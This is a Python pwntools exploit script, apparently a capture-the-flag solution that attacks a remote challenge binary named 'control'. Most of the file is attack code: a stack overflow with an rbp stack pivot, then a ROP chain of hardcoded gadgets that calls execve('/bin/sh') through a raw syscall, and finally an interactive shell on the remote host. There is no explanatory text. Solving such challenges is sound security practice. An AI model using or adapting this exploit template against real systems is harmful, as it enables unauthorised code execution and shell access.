# -*- coding: UTF-8 -*-

from pwn import *
from ctypes import *
#context.terminal = ['tmux', 'splitw', '-h']
#context(os='linux', arch='amd64')

#libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
banary = "./control"
elf = ELF(banary)
ip = '1'
port = 1

local = 0
if(local==1):
	p = process(banary)
else:
	p = remote('node5.buuoj.cn',29729)
context.log_level = "debug"

def debug():
	gdb.attach(p)
	pause()
	
s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
ru = lambda text : p.recvuntil(text)
uu32 = lambda : u32(p.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
uu64 = lambda : u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
lg = lambda s : log.info('\x1b[01;38;5;214m %s --> 0x%x \033[0m' % (s, eval(s)))
pi = lambda : p.interactive()
#------------------------ rbp-stack piviot  ----------------------------
#debug()

gift = 0x4D3350
vuln = 0x402183

payload = p64(gift) + p64(vuln)
sa("Gift> ",payload)

payload = b'a'*0x70
payload += p64(gift)
sa("control?", payload)

#------------------------ Gadget ----------------------------
pop_rax = 0x0000000000462c27
pop_rdi = 0x0000000000401c72
pop_rsi = 0x0000000000405285
pop_rdx_rbx = 0x0000000000495b8b
syscall = 0x000000000040161e

#------------------------ ret2syscall ----------------------------
binsh = gift

payload =  p64(0)*14
payload += b'/bin/sh\x00'
payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx_rbx)
payload += p64(0)
payload += p64(0)
payload += p64(syscall)

s(payload)

    
pi()